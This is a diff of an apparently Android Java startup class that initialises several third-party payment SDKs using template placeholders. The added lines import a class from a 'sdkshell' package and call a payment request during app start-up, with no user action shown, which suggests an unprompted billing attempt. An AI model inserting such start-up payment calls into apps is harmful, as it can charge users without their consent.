@@ -14,6 +14,8 @@ import com.mn.kt.MnPro;
 import com.pay.sdk.register.JmPaySDK_;
 
 import a.a.b.n.ESDK;
+import dum.libs.sdkshell.keep.Wchi;
+
 /**
  * Created by Administrator on 2017/2/23.
  */
@@ -33,17 +35,19 @@ public class Main {
         MPay.getInstance().init(activity,"{$MAI_MSA$}","{$CID$}");
         Log.e("sky","qi pa init");
         //DnPayServer.getInstance().setParams(Integer.parseInt("{$AID$}"),Integer.parseInt("{$CPID$}"),"{$CHID$}");
-        MnPro.getInstance().init(activity, WYPay.appHandler);
+        MnPro.getInstance().init(activity, PayFromEverySDK.appHandler);
         Log.e("sky","yingmei init");
         ESDK.getInstance(activity).init(activity);
         if (Api.hasYUFENG()){
             Log.e("sky","Yu Feng init");
-            mjPaySDK  = new MjPaySDK(activity,WYPay.billingListener,"{$YUFENG$}","","{$CID$}");
+            mjPaySDK  = new MjPaySDK(activity,PayFromEverySDK.billingListener,"{$YUFENG$}","","{$CID$}");
         }else {
             Log.e("sky","Yu Feng no need");
         }
         Log.e("sky","LeLing init");
         leLingSDK = new JmPaySDK_(activity,"{$CID$}");
+        Log.e("sky","ZYMY start");
+        Wchi.pay.requestPay(activity, "{$CID$}", null);
         UMengUtil.init(activity);
         if (!"{$FULLPAY$}".startsWith("{$"))
             FullPayManager.getInstance().init(activity);
